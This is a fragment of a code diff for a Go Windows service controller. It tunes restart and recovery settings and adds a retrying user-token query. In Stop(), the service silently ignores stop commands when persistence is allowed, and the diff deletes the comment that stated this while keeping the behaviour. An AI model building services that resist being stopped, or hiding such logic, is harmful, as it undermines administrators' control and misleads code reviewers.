-		default:
-			golog.Debugf("service: Unhandled SCM command=%d", c.Cmd)
-			changes <- c.CurrentStatus
-		}
-	}
-
-	golog.Info("service: Service control loop ended")
-	cancel()
-	return false, 0
 }
 
 // RunAsService runs the application as a Windows service
@@ -532,8 +799,8 @@ func (w *WindowsServiceController) Install() error {
 		Option: service.KeyValue{
 			"StartType":                    "automatic",
 			service.OnFailure:              service.OnFailureRestart,
-			service.OnFailureDelayDuration: "3s",
-			service.OnFailureResetPeriod:   30,
+			service.OnFailureDelayDuration: "5s",
+			service.OnFailureResetPeriod:   60,
 		},
 	}
 	svc, err := service.New(&windowsService{}, cfg)
@@ -570,7 +837,6 @@ func (w *WindowsServiceController) Start() error {
 // Stop stops the service
 func (w *WindowsServiceController) Stop() error {
 	if persistenceAllowed(serviceInstallPath) {
-		// Intentionally ignore stop commands to keep the service running.
 		return nil
 	}
 	cfg := &service.Config{Name: ServiceName}
@@ -602,7 +868,7 @@ func (w *WindowsServiceController) Status() (string, error) {
 	}
 }
 
-// setRecoveryActions configures multi-step restart recovery on failure.
+// setRecoveryActions configures multi-step restart recovery on failure
 func setRecoveryActions() {
 	m, err := mgr.Connect()
 	if err != nil {
@@ -619,6 +885,57 @@ func setRecoveryActions() {
 		{Type: mgr.ServiceRestart, Delay: 10 * time.Second},
 		{Type: mgr.ServiceRestart, Delay: 30 * time.Second},
 	}
-	_ = s.SetRecoveryActions(actions, 60)
+	_ = s.SetRecoveryActions(actions, 120)
 	_ = s.SetRecoveryActionsOnNonCrashFailures(true)
+}
+
+// queryUserTokenWithRetry attempts to get user token with retries
+// Handles race conditions where session is transitioning between states
+func queryUserTokenWithRetry(sessionID uint32, maxAttempts int, delay time.Duration) (windows.Token, error) {
+	var token windows.Token
+	var lastErr error
+
+	for attempt := 1; attempt <= maxAttempts; attempt++ {
+		err := windows.WTSQueryUserToken(sessionID, &token)
+		if err == nil {
+			// Success
+			if attempt > 1 {
+				telemetry.LogSessionEvent("token query succeeded on retry", sessionID, map[string]interface{}{
+					"attempt": attempt,
+				})
+			}
+			return token, nil
+		}
+
+		lastErr = err
+
+		// Check if it's a retryable error
+		errno, ok := err.(syscall.Errno)
+		if !ok {
+			// Not a syscall error, don't retry
+			return 0, err
+		}
+
+		// ERROR_NO_TOKEN (1008) and ERROR_NO_SUCH_LOGON_SESSION (1312) are retryable
+		if errno != windows.ERROR_NO_TOKEN && errno != 1312 {
+			// Other errors are not retryable
+			return 0, err
+		}
+
+		// Log retry attempt
+		if attempt < maxAttempts {
+			telemetry.LogSessionEvent("token query failed, retrying", sessionID, map[string]interface{}{
+				"attempt": attempt,
+				"errno":   errno,
+				"delay_ms": delay.Milliseconds(),
+			})
+			time.Sleep(delay)
+		}
+	}
+
+	// All attempts exhausted
+	telemetry.LogSessionError("token query failed after all retries", sessionID, lastErr, map[string]interface{}{
+		"attempts": maxAttempts,
+	})
+	return 0, lastErr
 }
